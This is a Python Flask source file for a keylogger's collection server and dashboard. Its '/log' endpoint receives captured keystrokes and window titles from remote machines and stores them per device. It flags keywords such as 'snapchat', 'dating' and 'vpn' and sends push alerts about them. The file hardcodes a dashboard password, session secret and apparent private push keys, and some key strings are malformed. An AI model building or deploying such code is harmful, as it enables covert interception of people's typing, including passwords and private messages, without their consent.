from flask import Flask, request, jsonify, render_template, redirect, session, url_for
from datetime import datetime
import json
import os

app = Flask(__name__)
app.secret_key = "loveyou"  

# ==========================================
#  CONFIG
# ==========================================
DASHBOARD_PASSWORD = "handkerchief"  

ALERT_KEYWORDS = [
    "tiktok", "porn", "sex", "nude", "snapchat",
    "instagram", "facebook", "discord", "explicit",
    "onlyfans", "dating", "tinder", "vpn"
    # add more words here
]

LOG_DIR  = "logs"
ALERT_LOG = "logs/alerts.txt"
SUBS_FILE = "logs/subscriptions.json"

VAPID_PUBLIC_KEY  = ": "BPUyGdo0liHiXpw0NIfvu7IF3_qHT5RmijDRWuE7EUsfvll34uoCK4D85LxYmujGdu-3zLuUFeSHefMJajr1B2U","   # from vapidkeys.com
VAPID_PRIVATE_KEY = ": "4p8-z8VOo4C13Ei9K8fnvXNi94s6RhaJ536ha-Ll50Q"
}"  # from vapidkeys.com

os.makedirs(LOG_DIR, exist_ok=True)

# ==========================================
#  HELPERS
# ==========================================
def logged_in():
    return session.get("auth") == True

def get_subscriptions():
    if os.path.exists(SUBS_FILE):
        with open(SUBS_FILE, "r") as f:
            return json.load(f)
    return []

def save_subscription(sub):
    subs = get_subscriptions()
    if sub not in subs:
        subs.append(sub)
    with open(SUBS_FILE, "w") as f:
        json.dump(subs, f)

def send_push(message):
    try:
        from pywebpush import webpush, WebPushException
        for sub in get_subscriptions():
            try:
                webpush(
                    subscription_info=sub,
                    data=message,
                    vapid_private_key=VAPID_PRIVATE_KEY,
                    vapid_claims={"sub": "mailto:admin@example.com"}
                )
            except WebPushException as e:
                print(f"Push failed: {e}")
    except Exception as e:
        print(f"Push error: {e}")

def check_keywords(host, window, data):
    data_lower = data.lower()
    triggered  = [w for w in ALERT_KEYWORDS if w in data_lower]
    if triggered:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(ALERT_LOG, "a", encoding="utf-8") as f:
            f.write(f"\n[{ts}] HOST: {host} | WINDOW: {window}\n")
            f.write(f"KEYWORDS: {', '.join(triggered)}\n")
            f.write(f"CONTEXT: {data[:200]}\n")
            f.write("-" * 40 + "\n")
        msg = f"ALERT\nDevice: {host}\nWindow: {window}\nKeywords: {', '.join(triggered)}"
        send_push(msg)

# ==========================================
#  LOGIN
# ==========================================
@app.route("/login", methods=["GET", "POST"])
def login():
    error = ""
    if request.method == "POST":
        if request.form.get("password") == DASHBOARD_PASSWORD:
            session["auth"] = True
            return redirect(url_for("index"))
        error = "Wrong password"
    return render_template("login.html", error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ==========================================
#  DASHBOARD
# ==========================================
@app.route("/")
def index():
    if not logged_in():
        return redirect(url_for("login"))
    machines = []
    if os.path.exists(LOG_DIR):
        for f in sorted(os.listdir(LOG_DIR)):
            if f.endswith(".txt") and f != "alerts.txt":
                name  = f[:-4]
                path  = os.path.join(LOG_DIR, f)
                size  = os.path.getsize(path)
                mtime = os.path.getmtime(path)
                last_seen = datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
                machines.append({"name": name, "size": size, "last_seen": last_seen})
    alert_count = 0
    if os.path.exists(ALERT_LOG):
        with open(ALERT_LOG, "r") as f:
            alert_count = f.read().count("KEYWORDS:")
    return render_template("index.html", machines=machines, alert_count=alert_count)

@app.route("/view/<host>")
def view_log(host):
    if not logged_in():
        return redirect(url_for("login"))
    safe_host = "".join(c for c in host if c.isalnum() or c in "-_.")
    log_file  = os.path.join(LOG_DIR, f"{safe_host}.txt")
    if not os.path.exists(log_file):
        return "No log found.", 404
    with open(log_file, "r", encoding="utf-8", errors="replace") as f:
        content = f.read()
    return render_template("view.html", host=safe_host, content=content)

@app.route("/alerts")
def alerts():
    if not logged_in():
        return redirect(url_for("login"))
    content = ""
    if os.path.exists(ALERT_LOG):
        with open(ALERT_LOG, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
    count = content.count("KEYWORDS:")
    return render_template("alerts.html", content=content, count=count)

# ==========================================
#  ACTIONS
# ==========================================
@app.route("/clear/<host>", methods=["POST"])
def clear_log(host):
    if not logged_in():
        return jsonify({"error": "unauthorized"}), 401
    safe_host = "".join(c for c in host if c.isalnum() or c in "-_.")
    log_file  = os.path.join(LOG_DIR, f"{safe_host}.txt")
    if os.path.exists(log_file):
        open(log_file, "w").close()
    return jsonify({"status": "cleared"}), 200

@app.route("/clear-alerts", methods=["POST"])
def clear_alerts():
    if not logged_in():
        return jsonify({"error": "unauthorized"}), 401
    if os.path.exists(ALERT_LOG):
        open(ALERT_LOG, "w").close()
    return jsonify({"status": "cleared"}), 200

@app.route("/subscribe", methods=["POST"])
def subscribe():
    if not logged_in():
        return jsonify({"error": "unauthorized"}), 401
    save_subscription(request.get_json())
    return jsonify({"status": "subscribed"}), 200

# ==========================================
#  RECEIVE KEYLOG DATA
# ==========================================
@app.route("/log", methods=["POST"])
def receive_log():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data"}), 400
        host    = data.get("host", "unknown").strip()
        payload = data.get("data", "")
        window  = data.get("window", "")
        ts      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        safe_host = "".join(c for c in host if c.isalnum() or c in "-_.")
        if not safe_host:
            safe_host = "unknown"
        log_file = os.path.join(LOG_DIR, f"{safe_host}.txt")
        with open(log_file, "a", encoding="utf-8") as f:
            if window:
                f.write(f"\n\n--- [{window}] [{ts}] ---\n")
            f.write(payload)
        check_keywords(host, window, payload)
        print(f"[{ts}] Received from {host} — {len(payload)} chars")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500

# ==========================================
#  SERVICE WORKER
# ==========================================
from flask import send_from_directory

@app.route('/sw.js')
def sw():
    return send_from_directory('static', 'sw.js',
                               mimetype='application/javascript')

# ==========================================
#  HEALTH CHECK
# ==========================================
@app.route("/health")
def health():
    return jsonify({"status": "running"}), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
